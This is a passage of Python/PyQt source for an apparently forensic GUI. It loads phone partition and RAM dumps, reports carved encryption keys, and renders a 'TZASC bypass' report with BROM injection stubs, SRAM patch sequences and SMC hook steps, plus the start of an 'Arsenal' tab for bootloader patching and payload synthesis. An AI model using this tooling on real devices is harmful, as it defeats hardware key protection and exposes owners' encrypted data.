        def _set_status(self, msg: str, color: str = "#80c8ff"):
            self._status_lbl.setText(f"  {msg}")
            self._status_lbl.setStyleSheet(f"color:{color};font-size:10px;padding:2px;")

        def _cleanup_tab_partitions(self):
            """v9.9: Explicitly close mmap objects and file handles held by this tab.
            v11.3: Gracefully stop any active RamCarveWorker (allow finally blocks
            to execute) before closing file handles."""
            # Gracefully request worker stop — allow mmap.close() in finally block
            if self._ram_worker is not None and self._ram_worker.isRunning():
                self._ram_worker.request_stop()
                self._ram_worker.wait(3000)
            if self._ram_worker is not None:
                self._ram_worker.deleteLater()
                self._ram_worker = None
            for tag, mmap_obj in list(self._partition_store.items()):
                try:
                    mmap_obj.close()
                except Exception as e:
                    print(f"[WARN] mmap.close() failed for {tag}: {e}", file=sys.stderr)
            self._partition_store.clear()
            for tag, (fh, _) in list(self._partition_handles.items()):
                try:
                    fh.close()
                except Exception as e:
                    print(f"[WARN] fh.close() failed for {tag}: {e}", file=sys.stderr)
            self._partition_handles.clear()

        # ── v11.3 Async RAM Carve Worker ────────────────────────────────────
        class RamCarveWorker(QThread):
            """v11.3 — Offload heavy EXT_RAM carving to a background thread.
            The worker receives a FILE PATH only (not mmap objects), opens
            its own mmap internally, and emits only serialisable results.
            This prevents passing large mmap objects across pyqtSignal
            boundaries (which causes Segmentation Faults on some Qt builds).
            A _should_quit flag allows graceful shutdown without hard terminate().
            """
            finished = pyqtSignal(list)   # carve_results (list of dicts)
            error    = pyqtSignal(str)

            def __init__(self, file_path: str):
                super().__init__()
                self.file_path = file_path
                self._should_quit = False

            def request_stop(self):
                """Signal the worker to abort at the next safe checkpoint."""
                self._should_quit = True

            def run(self):
                try:
                    with open(self.file_path, "rb") as fh:
                        try:
                            data = mmap.mmap(fh.fileno(), _get_real_size(fh.fileno()), access=mmap.ACCESS_READ)
                        except ValueError as e:
                            if "empty file" in str(e).lower():
                                self.error.emit("FILE_EMPTY — cannot carve empty dump.")
                                return
                            raise
                        try:
                            # v11.4 FIX: pass cancellation lambda into the engine so
                            # the worker can abort mid-scan instead of waiting for
                            # the entire multi-GB file to finish.
                            results = TZASCBypassEngine._carve_ram_file(
                                data, is_cancelled=lambda: self._should_quit
                            )
                            if not self._should_quit:
                                self.finished.emit(results)
                        finally:
                            del results
                            gc.collect()
                            data.close()
                except Exception as e:
                    if not self._should_quit:
                        self.error.emit(str(e))

        def _set_all_buttons_enabled(self, enabled: bool):
            """v11.3: Atomic enable/disable for all load buttons to prevent
            race conditions when an async worker is active."""
            for btn in self._load_btns.values():
                btn.setEnabled(enabled)

        def _load_file(self, tag: str):
            captions = {
                "META":   "Load metadata.img Binary Dump",
                "KEYREF": "Load keyrefuge.bin / keydata.bin",
                "TEE":    "Load tee1.bin / tz Image",
                "SEC":    "Load sec1.bin / sec Partition",
                "RAM":    "Load EXT_RAM Dump (RAM Carver — Path 1)",
                "LK":     "Load lk.bin Bootloader (SMC Hook — Path 3)",
            }
            filters = {
                "META":   "Binary Files (*.img *.bin *.raw);;All Files (*)",
                "KEYREF": "Binary Files (*.bin *.raw);;All Files (*)",
                "TEE":    "Binary Files (*.bin *.img *.raw);;All Files (*)",
                "SEC":    "Binary Files (*.bin *.raw);;All Files (*)",
                "RAM":    "RAM Dump (*.bin *.raw *.img *.dump);;All Files (*)",
                "LK":     "Bootloader (*.bin *.img *.raw);;All Files (*)",
            }
            path, _ = QFileDialog.getOpenFileName(
                self, captions[tag], "", filters[tag]
            )
            if not path:
                return
            try:
                fname = os.path.basename(path)
                # v13.0 FIX: EAFP — block devices report size 0 to getsize but mmap fine.
                _fh  = open(path, "rb")
                try:
                    data = mmap.mmap(_fh.fileno(), _get_real_size(_fh.fileno()), access=mmap.ACCESS_READ)
                except ValueError as e:
                    _fh.close()
                    if "empty file" in str(e).lower():
                        self._set_status(f"FILE_EMPTY: {fname}", "#ff4040")
                        return
                    raise
                # v12.0: Compute SHA-256 and log to Forensic Journal BEFORE storing
                if self._forensic_journal is not None:
                    sha = self._forensic_journal.record(
                        event_type="FILE_LOAD",
                        file_path=path,
                        data=bytes(data[:65536]),  # hash first 64KB for large files
                        notes=f"Tag: {tag}  |  Full size: {len(data):,} bytes"
                    )
                else:
                    sha = hashlib.sha256(bytes(data[:65536])).hexdigest()
                # v9.9: store mmap+fh so TZASCBypassEngine can reuse without redundant I/O
                if tag in self._partition_store:
                    try:
                        self._partition_store[tag].close()
                    except Exception as e:
                        print(f"[WARN] mmap.close() failed for {tag}: {e}", file=sys.stderr)
                if tag in self._partition_handles:
                    try:
                        self._partition_handles[tag][0].close()
                    except Exception as e:
                        print(f"[WARN] fh.close() failed for {tag}: {e}", file=sys.stderr)
                self._partition_store[tag] = data
                self._partition_handles[tag] = (_fh, path)
                # For large RAM dumps show size in MB
                size_str = (f"{len(data)/1048576:.1f} MB" if len(data) > 1048576
                            else f"{len(data):,} bytes")

                # v11.3: Async RAM carving for EXT_RAM dumps to prevent GUI freeze
                if tag == "RAM":
                    self._set_status(
                        f"Loaded: {fname} ({size_str}) — RAM carving in background thread...",
                        "#ffe060"
                    )
                    self._set_all_buttons_enabled(False)
                    self._ram_worker = self.RamCarveWorker(path)
                    self._ram_worker.finished.connect(
                        lambda results, t=tag, d=data, f=fname, p=path, s=size_str:
                        self._on_ram_carve_finished(results, t, d, f, p, s)
                    )
                    self._ram_worker.error.connect(
                        lambda msg, f=fname, s=size_str:
                        self._on_ram_carve_error(msg, f, s)
                    )
                    self._ram_worker.start()
                else:
                    self._set_status(f"Loaded: {fname} ({size_str}) — analyzing...", "#ffe060")
                    QApplication.processEvents()
                    # Pass mmap directly — supports slicing/find; avoids full heap copy
                    report = self._run_analyzer(tag, data, fname, path)
                    self._console.append(report)
                    self._set_status(f"Done: {fname} ({size_str})", "#60e060")
            except Exception as e:
                self._set_status(f"Error loading file: {e}", "#ff6060")
                self._console.append(f"\n[ERROR] {e}\n")

        def _on_ram_carve_finished(self, carve_results: list, tag: str,
                                    data, fname: str, path: str, size_str: str):
            """v11.3: Callback when async RAM carving completes successfully.
            Re-enables buttons and appends the full bypass report to console."""
            self._set_all_buttons_enabled(True)
            # Pass pre-computed carve_results so _path1_ram_carver skips synchronous scan
            report = self._run_analyzer(tag, data, fname, path,
                                        carve_results_override=carve_results)
            self._console.append(report)
            self._set_status(f"Done: {fname} ({size_str}) — {len(carve_results)} carve hit(s)", "#60e060")
            # v11.3 FIX: nullify stale worker reference and free Qt C++ object
            if self._ram_worker is not None:
                self._ram_worker.deleteLater()
                self._ram_worker = None

        def _on_ram_carve_error(self, msg: str, fname: str, size_str: str):
            """v11.3: Callback when async RAM carving fails. Re-enables buttons."""
            self._set_all_buttons_enabled(True)
            self._console.append(f"\n[ERROR] RAM carve failed for {fname}: {msg}\n")
            self._set_status(f"Error: {fname} ({size_str}) — carve failed", "#ff6060")
            # v11.3 FIX: nullify stale worker reference and free Qt C++ object
            if self._ram_worker is not None:
                self._ram_worker.deleteLater()
                self._ram_worker = None

        def _run_analyzer(self, tag: str, data: bytes, fname: str,
                          file_path: str = "", carve_results_override: list = None) -> str:
            sep  = "═" * 68
            sep2 = "─" * 68
            ts   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            lines = [
                f"\n{sep}",
                f"  File : {fname}   ({len(data):,} bytes)",
                f"  Time : {ts}",
                f"  Tag  : {tag}",
                sep2,
            ]

            try:
                if tag == "META":
                    res = MetadataPartitionAnalyzer.analyze(data)
                    lines += self._fmt_metadata(res)
                    # Auto-trigger TZASC Bypass Engine if hardware-protected
                    if res.get("hardware_protected"):
                        lines += self._fmt_tzasc_bypass({
                            "tzasc_reason": res.get("hardware_protect_reason",""),
                        })

                elif tag == "KEYREF":
                    res = KeyRefugeAnalyzer.analyze(data)
                    lines += self._fmt_keyrefuge(res)
                    # v12.4: Chain of custody — log SHA-256 of live-extracted key blobs with offset/region
                    if self._forensic_journal is not None:
                        for blob in res.get("key_blobs", [])[:16]:
                            sha = blob.get("extracted_sha256")
                            if sha:
                                self._forensic_journal.record(
                                    event_type="LIVE_EXTRACTION",
                                    file_path=file_path or fname,
                                    notes=f"Offset: {blob['offset']} | Region: KEYREF | "
                                          f"Type: {blob['key_type_str']} | SHA-256: {sha}"
                                )
                    # Auto-trigger TZASC Bypass Engine if blocked
                    if res.get("tzasc_blocked"):
                        lines += self._fmt_tzasc_bypass({
                            "tzasc_reason": res.get("tzasc_reason",""),
                        })

                elif tag == "TEE":
                    res = TEEImageAnalyzer.analyze(data)
                    lines += self._fmt_tee(res)

                elif tag == "SEC":
                    res = SecPartitionAnalyzerV2.analyze(data)
                    lines += self._fmt_sec(res)
                    # v12.4: Chain of custody — log SHA-256 of live-extracted Knox blobs with region
                    if self._forensic_journal is not None:
                        f = res.get("fields", {})
                        sec_offsets = {
                            "knox_fuse_sha256":      ("Knox Fuse", "0x0000"),
                            "attestation_ref_sha256":("Attestation Ref", "0x0040"),
                            "tee_region_sha256":     ("TEE Region", "0x0100"),
                        }
                        for field_name, (sha_key, offset_hex) in sec_offsets.items():
                            sha = f.get(field_name)
                            if sha:
                                self._forensic_journal.record(
                                    event_type="LIVE_EXTRACTION",
                                    file_path=file_path or fname,
                                    notes=f"Offset: {offset_hex} | Region: SEC | "
                                          f"Type: {sha_key} | SHA-256: {sha}"
                                )

                elif tag == "RAM":
                    # PATH 1: RamDumpCarver
                    # v11.3: if carve_results_override is provided (from async worker),
                    # pass it to skip synchronous scan and prevent GUI freeze.
                    ctx = {
                        "tzasc_reason": "MANUAL_RAM_CARVER_TRIGGER",
                        "ram_data": data,
                    }
                    if carve_results_override is not None:
                        ctx["carve_results"] = carve_results_override
                    lines += self._fmt_tzasc_bypass(ctx)

                elif tag == "LK":
                    # PATH 3: SMC Hook scan
                    lines += self._fmt_tzasc_bypass({
                        "tzasc_reason": "MANUAL_SMC_HOOK_TRIGGER",
                        "lk_data": data,
                    })

            except Exception as ex:
                lines.append(f"\n[ERROR during analysis] {ex}")

            # v12.0: Populate Hardware Capability Matrix from hard binary proof
            if 'res' in locals() and self._hcm is not None:
                self._update_hcm_from_analyzer(tag, res)

            lines.append(sep)
            return "\n".join(lines)

        def _update_hcm_from_analyzer(self, tag: str, res: dict):
            """v12.0 — Populate HCM from analyzer result dict using ONLY hard proof.
            No heuristics, no string guessing."""
            hcm = self._hcm
            if hcm is None:
                return

            if tag == "TEE":
                tee_str = res.get("tee_type", "UNKNOWN")
                if tee_str == "TEEGRIS":
                    hcm.set_field("tee_type", TEEType.TEEGRIS, "TEEImageAnalyzer: TEEGRIS signature")
                elif tee_str == "KINIBI":
                    hcm.set_field("tee_type", TEEType.KINIBI, "TEEImageAnalyzer: Kinibi signature")
                if res.get("tee_version"):
                    hcm.set_field("tee_version", res["tee_version"], "TEEImageAnalyzer: version string")
                if res.get("tee_compile_date"):
                    hcm.set_field("tee_compile_date", res["tee_compile_date"], "TEEImageAnalyzer: compile date")

            elif tag == "SEC":
                fields = res.get("fields", {})
                tee_inf = fields.get("tee_type_inferred")
                if tee_inf == "TEEGRIS":
                    hcm.set_field("tee_type", TEEType.TEEGRIS, "SecPartitionAnalyzerV2: TEEGRIS magic @ 0x0100")
                elif tee_inf == "KINIBI":
                    hcm.set_field("tee_type", TEEType.KINIBI, "SecPartitionAnalyzerV2: Kinibi magic @ 0x0100")
                hcm.set_field("knox_warranty_tripped", bool(fields.get("knox_warranty_tripped")),
                              "SecPartitionAnalyzerV2: warranty fuse byte")
                hcm.set_field("oem_lock_state", "LOCKED" if fields.get("oem_locked") else "UNLOCKED",
                              "SecPartitionAnalyzerV2: OEM lock byte")
                if fields.get("rollback_version") is not None:
                    hcm.set_field("rollback_version", int(fields["rollback_version"]),
                                  "SecPartitionAnalyzerV2: rollback struct")

            elif tag == "META":
                if res.get("hardware_protected"):
                    hcm.set_field("hardware_wrapped_keys", True,
                                  "MetadataPartitionAnalyzer: TZASC hardware protection")
                    hcm.set_field("fbe_version", FBEVersion.V2_WRAPPED,
                                  "MetadataPartitionAnalyzer: hardware-protected fscrypt")
                elif res.get("fscrypt_policy_str", "").startswith("v2"):
                    hcm.set_field("fbe_version", FBEVersion.V2,
                                  "MetadataPartitionAnalyzer: fscrypt policy v2")
                elif res.get("fscrypt_policy_str", "").startswith("v1"):
                    hcm.set_field("fbe_version", FBEVersion.V1,
                                  "MetadataPartitionAnalyzer: fscrypt policy v1")

            elif tag == "KEYREF":
                if res.get("assessment") == "AES_GCM_WRAPPED_BLOBS_FOUND":
                    hcm.set_field("hardware_wrapped_keys", True,
                                  "KeyRefugeAnalyzer: AES-GCM wrapped key blobs")
                if res.get("tzasc_blocked"):
                    hcm.set_field("hardware_wrapped_keys", True,
                                  "KeyRefugeAnalyzer: TZASC block implies hardware wrapping")

        # ── Report formatters ─────────────────────────────────────────────────
        def _fmt_metadata(self, r: dict) -> list:
            out = [
                f"  ♦ METADATA PARTITION ANALYSIS",
                f"  Size            : {r['size_bytes']:,} bytes",
                f"  Encryption State: {r['encryption_state']}",
            ]
            # ── TZASC alert (prominent) ─────────────────────────────────────
            if r.get("hardware_protected"):
                out += [
                    "",
                    "  ╔══════════════════════════════════════════════════════════╗",
                    "  ║  ⚠  TZASC HARDWARE READ PROTECTION DETECTED             ║",
                    f"  ║  Reason: {r.get('hardware_protect_reason',''):<50} ║",
                    "  ║  The buffer returned all-zero / all-0xFF bytes.          ║",
                    "  ║  TZASC memory firewall blocked the DMA transfer.         ║",
                    "  ║  → TZASCBypassEngine activated (see report below)        ║",
                    "  ╚══════════════════════════════════════════════════════════╝",
                    "",
                ]
            else:
                out += [
                    f"  Magic Found     : {r['magic_found']}   Magic offset: {r.get('magic_offset','—')}",
                    f"  Version         : {r['version']}",
                    f"  fscrypt policy  : {r.get('fscrypt_policy_str','—')}",
                ]
                # Deep scan sectors
                if r.get("deep_scan_sectors"):
                    out.append(f"  Deep Scan Found  : {len(r['deep_scan_sectors'])} sector(s)")
                out += [
                    "",
                    "  ── Header Hexdump ──────────────────────────────────────",
                    r.get("header_hexdump", "  (not available)"),
                    "",
                    f"  ── Keymaster / Keymint Tokens ({len(r['keymaster_tokens'])}) ──────────────────",
                ]
                for tok in r["keymaster_tokens"][:10]:
                    out.append(
                        f"    {tok['offset']}  sig={tok.get('signature','?')[:16]}"
                        f"  entropy={tok['entropy']}"
                        f"  ctx={tok['context_hex'][:24]}"
                    )
                out += [
                    "",
                    f"  ── Weaver Slot IDs ({len(r['weaver_slots'])}) ──────────────────────────────",
                ]
                for ws in r["weaver_slots"][:5]:
                    out.append(f"    {ws['offset']}  context={ws['context']}")
                out += [
                    "",
                    f"  ── Encrypted Key Blobs ({len(r['encrypted_blobs'])}) ────────────────────────",
                ]
                for blob in r["encrypted_blobs"][:8]:
                    flag = "LIKELY_ENCRYPTED_KEY_BLOB" if blob["entropy"] > 7.0 else "HIGH_ENTROPY_DATA"
                    out.append(
                        f"    {blob['offset']}  {blob['size_bytes']:4d}B  "
                        f"entropy={blob['entropy']}  {flag}"
                    )
                    out.append(f"      first16={blob['first16_hex']}")
            if r["warnings"]:
                out.append("  ── Warnings ─────────────────────────────────────────────")
                for w in r["warnings"]:
                    out.append(f"    ⚠ {w}")
            if r["notes"]:
                out.append("  ── Notes ────────────────────────────────────────────────")
                for n in r["notes"]:
                    out.append(f"    → {n}")
            return out

        def _fmt_keyrefuge(self, r: dict) -> list:
            out = [
                f"  ♦ KEYREFUGE / KEYDATA PARTITION ANALYSIS",
                f"  Size            : {r['size_bytes']:,} bytes",
                f"  Assessment      : {r['assessment']}",
            ]
            # ── TZASC alert (prominent) ─────────────────────────────────────
            if r.get("tzasc_blocked"):
                out += [
                    "",
                    "  ╔══════════════════════════════════════════════════════════╗",
                    "  ║  ⚠  TZASC_HARDWARE_READ_PROTECTED                       ║",
                    f"  ║  Reason: {r.get('tzasc_reason','')[:50]:<50} ║",
                    "  ║  Partition returned zero/0xFF — TZASC DMA filter active  ║",
                    "  ║  BROM bypass succeeded at transport layer.               ║",
                    "  ║  TZASC region table marks this address SECURE-ONLY.      ║",
                    "  ║  → TZASCBypassEngine activated (see report below)        ║",
                    "  ╚══════════════════════════════════════════════════════════╝",
                    "",
                ]
            else:
                out += [
                    f"  Magic Found     : {r['magic_found']}   Type: {r.get('magic_type','—')}   "
                    f"Offset: {r.get('magic_offset','—')}",
                    f"  Overall Entropy : {r['overall_entropy']} bits/byte",
                    "",
                    f"  ── Structured Key Blobs ({len(r['key_blobs'])}) ───────────────────────────",
                ]
                for blob in r["key_blobs"]:
                    out.append(
                        f"    {blob['offset']}  type={blob['key_type_str']}  "
                        f"len={blob['key_length']}B  entropy={blob['payload_entropy']}"
                    )
                    out.append(f"      nonce={blob['nonce_hex']}  wrapping={blob['wrapping']}")
                    out.append(f"      first16={blob['first16_hex']}")
                out += [
                    "",
                    f"  ── AES-GCM Candidates ({len(r['aes_gcm_candidates'])}) ───────────────────────────",
                ]
                for cand in r["aes_gcm_candidates"][:8]:
                    out.append(
                        f"    payload={cand['payload_offset']}  nonce={cand['nonce_offset']}"
                        f"  nonce_ent={cand['nonce_entropy']}  payload_ent={cand['payload_entropy']}"
                    )
                    out.append(f"    → {cand['assessment']}")
                    out.append(f"    nonce_hex={cand['nonce_hex']}")
                out += [
                    "",
                    f"  ── Entropy Scan ({len(r['entropy_scan'])} high-entropy blocks) ──────────────",
                ]
                for blk in r["entropy_scan"][:12]:
                    out.append(
                        f"    {blk['offset']}  entropy={blk['entropy']}  first8={blk['first8']}"
                    )
            if r["warnings"]:
                out.append("  ── Warnings ─────────────────────────────────────────────")
                for w in r["warnings"]:
                    out.append(f"    ⚠ {w}")
            if r["notes"]:
                out.append("  ── Notes ────────────────────────────────────────────────")
                for n in r["notes"]:
                    out.append(f"    → {n}")
            return out

        def _fmt_tzasc_bypass(self, ctx: dict) -> list:
            """Format TZASCBypassEngine full report.
            v9.9: Builds a full context dict that passes already-mapped
            ram_data / lk_data / tee_data from self._partition_store
            so TZASCBypassEngine methods never redundantly open files.
            """
            sep2 = "─" * 68
            out  = [
                "",
                "═" * 68,
                "  ▶▶ TZASC BYPASS ENGINE — v9.9 — Alternative Extraction Paths",
                "═" * 68,
            ]
            try:
                full_ctx = {
                    "chip_id":      ctx.get("chip_id", ""),
                    "tzasc_reason": ctx.get("tzasc_reason", "Unknown"),
                    "ufs_lun":      ctx.get("ufs_lun", 5),
                    "lba_start":    ctx.get("lba_start", 0),
                    "lba_count":    ctx.get("lba_count", 128),
                    # v9.9: prefer data passed directly in ctx, else fall back to store
                    "ram_data":     ctx.get("ram_data") or self._partition_store.get("RAM"),
                    "lk_data":      ctx.get("lk_data")  or self._partition_store.get("LK"),
                    "tee_data":     ctx.get("tee_data") or self._partition_store.get("TEE"),
                    # v11.3 FIX: propagate pre-computed carve_results from async worker
                    "carve_results": ctx.get("carve_results"),
                    # v12.2 FIX: pass HCM so _path1_ram_carver can prune irrelevant TEE scans
                    "hcm":          self._hcm,
                }
                bypass = TZASCBypassEngine.generate_bypass_report(full_ctx)
                out += [
                    f"  Engine  : {bypass['engine']}",
                    f"  Chip    : {bypass['chip_id']}",
                    f"  Trigger : {bypass['tzasc_reason']}",
                    "",
                    "  Priority Order:",
                ]
                for p in bypass["priority_order"]:
                    out.append(f"    {p}")

                # PATH 2: UFS HCI (highest priority)
                p2 = bypass["path2_ufs_hci"]
                out += [
                    "",
                    sep2,
                    "  PATH-2 ► UFS HCI Direct Read Bypass",
                    sep2,
                    f"  Target LUN : {p2['target_lun']}  (keyrefuge)",
                    f"  LBA Start  : {p2['lba_start']}   LBA Count: {p2['lba_count']}",
                    f"  Block Size : {p2['block_size']} bytes",
                    f"  Total      : {p2['total_bytes']:,} bytes",
                    "",
                    f"  Batch READ(10) CDB : {p2['batch_read10_cdb']}",
                    f"  Batch READ(16) CDB : {p2['batch_read16_cdb']}",
                    "",
                    "  UFSHCI Register Map (MT6877):",
                ]
                for reg, addr in p2["ufshci_registers"].items():
                    out.append(f"    {reg:25s}: {addr}")
                out += [
                    "",
                    "  First 4 Sector Descriptors:",
                ]
                for sd in p2["sector_descriptors"][:4]:
                    out.append(
                        f"    LBA {sd['lba_hex']}  "
                        f"Read10={sd['cdb_read10']}  "
                        f"Read16={sd['cdb_read16']}"
                    )
                # UPG-v97-03: render ARM64 stub payload_hex for operator use
                ph = p2.get("payload_hex", "")
                out += [
                    "",
                    "  ARM64 DA Stub — inject via BROM (payload_hex):",
                    f"    {ph[:80]}{'…' if len(ph) > 80 else ''}",
                    f"  UTRD addr : {p2.get('utrd_phys','?')}  "
                    f"PRDT addr: {p2.get('prdt_phys','?')}",
                    f"  CDB16     : {p2.get('cdb16_hex','?')}",
                ]
                out.append(f"  ⚠ {p2['warning'][:100]}")

                # PATH 1: RamDumpCarver
                p1 = bypass["path1_ram_carver"]
                out += [
                    "",
                    sep2,
                    "  PATH-1 ► RAM Dump Carver",
                    sep2,
                    f"  Status : {p1['status']}",
                    "",
                    "  Algorithm:",
                ]
                for step in p1["algorithm"]:
                    out.append(f"    {step}")
                out += [
                    "",
                    "  Struct Layout:",
                    f"    fscrypt_key : {p1['struct_layout']['fscrypt_key']}",
                    f"    session_key : {p1['struct_layout']['session_key']}",
                    f"    weaver_token: {p1['struct_layout']['weaver_token']}",
                    f"  Optimal Window: {p1['optimal_window'][:100]}",
                ]
                if p1["carve_results"]:
                    out.append(f"\n  Carve Results ({len(p1['carve_results'])} hits):")
                    for hit in p1["carve_results"][:8]:
                        if "error" in hit:
                            out.append(f"    ERROR: {hit['error']}")
                        else:
                            out.append(
                                f"    {hit['offset']}  type={hit['type']}"
                                f"  entropy={hit.get('entropy','?')}"
                                f"  assessment={hit.get('assessment','?')}"
                            )
                            if "key_hex" in hit:
                                out.append(f"      key_hex={hit['key_hex'][:48]}…")
                            elif "payload_hex" in hit:
                                out.append(f"      payload={hit['payload_hex'][:48]}…")
                    # v12.4: Chain of custody — log SHA-256 of every live-extracted raw key with context
                    if self._forensic_journal is not None:
                        for hit in p1["carve_results"][:16]:
                            sha = hit.get("extracted_sha256")
                            if sha:
                                self._forensic_journal.record(
                                    event_type="LIVE_EXTRACTION",
                                    file_path=ctx.get("file_path", "RAM_DUMP"),
                                    notes=f"Offset: {hit['offset']} | Region: RAM_DUMP | "
                                          f"Type: {hit['type']} | SHA-256: {sha} | "
                                          f"Assessment: {hit.get('assessment','?')}"
                                )

                # PATH 3: ATF/SMC Hook
                p3 = bypass["path3_smc_hook"]
                out += [
                    "",
                    sep2,
                    "  PATH-3 ► ATF / SMC Handler Hook",
                    sep2,
                    "",
                    "  Hook Strategy:",
                ]
                for step in p3["hook_strategy"]:
                    out.append(f"    {step}")
                out += ["", "  SMC Function IDs:"]
                for k, v in p3["smc_ids"].items():
                    out.append(f"    {k:30s}: {v}")
                # lk.bin scan results
                out.append("\n  lk.bin Scan Results:")
                for hit in p3["lk_scan_results"][:6]:
                    if "error" in hit:
                        out.append(f"    ERROR: {hit['error']}")
                    elif hit.get("status") == "NOT_LOADED":
                        out.append(f"    {hit['note']}")
                    elif hit.get("status") == "NO_SMC_FOUND":
                        out.append(f"    No SMC instructions found in {hit.get('label','')}")
                    else:
                        out.append(
                            f"    [{hit.get('arch','?')}] offset={hit.get('offset','?')}"
                            f"  hook_target={hit.get('hook_target','?')}"
                        )
                # tee1.bin scan results
                out.append("\n  tee1.bin Scan Results:")
                for hit in p3["tee_scan_results"][:6]:
                    if "error" in hit:
                        out.append(f"    ERROR: {hit['error']}")
                    elif hit.get("status") == "NOT_LOADED":
                        out.append(f"    {hit['note']}")
                    elif hit.get("status") == "NO_SMC_FOUND":
                        out.append(f"    No SMC instructions found in {hit.get('label','')}")
                    else:
                        out.append(
                            f"    [{hit.get('arch','?')}] offset={hit.get('offset','?')}"
                        )
                # UPG-v97-04: render BROM WRITE32 / CMD_WRITE16 live SRAM patch
                patch_t = p3.get("patch_template", {})
                out += [
                    "",
                    "  Live SRAM Patch (BROM_LIVE_SRAM_PATCH):",
                    f"    SRAM Base   : {patch_t.get('sram_base','?')}",
                    f"    SMC Offset  : {patch_t.get('smc_file_offset','?')}",
                    f"    Hook Addr   : {patch_t.get('hook_sram_addr','?')}",
                    f"    Staging Buf : {patch_t.get('staging_buffer','?')}",
                    "",
                    "  BROM WRITE32 Sequence (inject via BROM USB protocol):",
                ]
                for cmd in patch_t.get("brom_write32_sequence", []):
                    out.append(f"    {cmd}")
                out += [
                    "",
                    "  CMD_WRITE16 Sequence (arm hook via JTAG/SIB control regs):",
                ]
                for cmd in patch_t.get("brom_cmd_write16_sequence", []):
                    out.append(f"    {cmd}")
                out += ["", "  Hook Instructions (ARM64 disassembly):"]
                for ins in patch_t.get("hook_instructions", []):
                    out.append(f"    {ins}")
                prereq = patch_t.get("prerequisite", "")
                if prereq:
                    out.append(f"\n  Prerequisites: {prereq[:120]}")

            except Exception as ex:
                out.append(f"  [TZASCBypassEngine ERROR] {ex}")

            out += ["", "═" * 68]
            return out

        def _fmt_tee(self, r: dict) -> list:
            km = r.get("keymaster_ta") or {}
            uuid_hits = r.get("uuid_scan", [])
            out = [
                f"  ♦ TEE IMAGE ANALYSIS",
                f"  Size            : {r['size_bytes']:,} bytes",
                f"  TEE Type        : {r['tee_type']}",
                f"  TEE Version     : {r.get('tee_version','—')}",
                f"  Compile Date    : {r.get('tee_compile_date','—')}",
                f"  TZ Header Type  : {r.get('tz_header_type','—')}  @ {r.get('tz_header_offset','—')}",
                f"  Overall Entropy : {r['overall_entropy']} bits/byte",
                "",
                "  ── Header Hexdump (first 64 bytes) ─────────────────────",
                r.get("header_hexdump", "  (not available)"),
                "",
                f"  ── TEE Signatures Found ({len(r['tee_signatures'])}) ───────────────────────",
            ]
            for sig in r["tee_signatures"]:
                out.append(f"    {sig['offset']}  [{sig['type']}]  '{sig['signature']}'")
            out += [
                "",
                f"  ── UUID-Based TA Scan ({len(uuid_hits)} hits) ───────────────────────────",
            ]
            for u in uuid_hits[:8]:
                out.append(
                    f"    {u['offset']}  [{u['label']}]"
                    f"  entropy={u['entropy']}"
                )
                out.append(f"      uuid={u['uuid_hex']}")
            out += [
                "",
                f"  ── Trustlets / TAs ({len(r['trustlets'])}) ──────────────────────────────",
            ]
            for ta in r["trustlets"][:10]:
                out.append(
                    f"    {ta['offset']}  sig='{ta['signature']}'  "
                    f"entropy={ta['entropy']}"
                )
                out.append(f"      hdr={ta['header_hex'][:32]}")
            out += [
                "",
                "  ── Keymaster TA ─────────────────────────────────────────",
                f"    Found   : {km.get('found', False)}",
                f"    Method  : {km.get('method','—')}",
            ]
            if km.get("found"):
                out.append(f"    Offset  : {km.get('offset','—')}")
                out.append(f"    ID Str  : {km.get('id_str','—')}")
                out.append(f"    Entropy : {km.get('entropy','—')}")
                out.append(f"    Context : {km.get('context','')[:48]}")
            if r["warnings"]:
                out.append("  ── Warnings ─────────────────────────────────────────────")
                for w in r["warnings"]:
                    out.append(f"    ⚠ {w}")
            if r["notes"]:
                out.append("  ── Notes ────────────────────────────────────────────────")
                for n in r["notes"]:
                    out.append(f"    → {n}")
            return out

        def _fmt_sec(self, r: dict) -> list:
            f = r.get("fields", {})
            out = [
                f"  ♦ SEC PARTITION ANALYSIS  [{r.get('analyzer_version','')}]",
                f"  Size            : {r['size_bytes']:,} bytes",
                f"  Knox Warranty   : {r['knox_warranty_tripped']}  "
                f"(False=intact, True=TRIPPED, PARTIAL=mixed)",
                f"  OEM Lock State  : {f.get('oem_lock_state','—')}  "
                f"(byte={f.get('oem_lock_byte','—')})",
                f"  Rollback Version: {r['rollback_version']}  "
                f"({f.get('rollback_version_hex','—')})",
                f"  TEE Type        : {r['tee_type_inferred']}",
                f"  Attestation Key : {r['attestation_key_present']}",
                f"  Reserved Entropy: {r['reserved_entropy']} bits/byte",
                "",
                "  ── Header Hexdump (first 128 bytes) ─────────────────────",
                r.get("header_hexdump", "  (not available)"),
                "",
                "  ── Field Map ────────────────────────────────────────────",
                f"    0x0000  [64B]  Knox Fuse  : {f.get('knox_fuse_hex','—')[:48]}",
                f"    0x0040  [64B]  Attest Ref : {f.get('attestation_ref_hex','—')[:48]}",
                f"    0x0080  [ 4B]  Rollback   : {f.get('rollback_version_hex','—')}  "
                f"= {f.get('rollback_version_dec','—')}",
                f"    0x00C0  [ 1B]  OEM Lock   : {f.get('oem_lock_byte','—')}  "
                f"→ {f.get('oem_lock_state','—')}",
                f"    0x0100  [64B]  TEE Region : {f.get('tee_region_hex','—')[:32]}",
                f"    0x0200 [256B]  Reserved   : entropy={f.get('reserved_block_entropy','—')}",
            ]
            if r["warnings"]:
                out.append("  ── Warnings ─────────────────────────────────────────────")
                for w in r["warnings"]:
                    out.append(f"    ⚠ {w}")
            if r["notes"]:
                out.append("  ── Notes ────────────────────────────────────────────────")
                for n in r["notes"]:
                    out.append(f"    → {n}")
            return out


    class ArsenalTab(QWidget):
        """
        v13.0 — ☣️ Arsenal: Synthesis & Emulation.
        Red-themed tab for:
          • DA Patching (SLA lobotomy)
          • BROM Payload Synthesis (per-hw_code ROP)
          • LK Micro-Emulation (Unicorn SMC trap)
        """
        def __init__(self, hcm: HardwareCapabilityMatrix = None):
            super().__init__()
            self._hcm = hcm if hcm is not None else HardwareCapabilityMatrix()
            root = QVBoxLayout(self)
            root.setContentsMargins(6, 6, 6, 6)
            root.setSpacing(6)

            hdr = QLabel("  ☣️  ARSENAL — Synthesis & Emulation  v13.0")
            hdr.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
            hdr.setStyleSheet("color:#ff4040;background:#1a0a0a;padding:6px;border-radius:4px;")
            root.addWidget(hdr)

            # ── Row 1: Patch DA ───────────────────────────────────────────────
            da_grp = QGroupBox("1. DA Patch Engine (Frankenstein DA)")
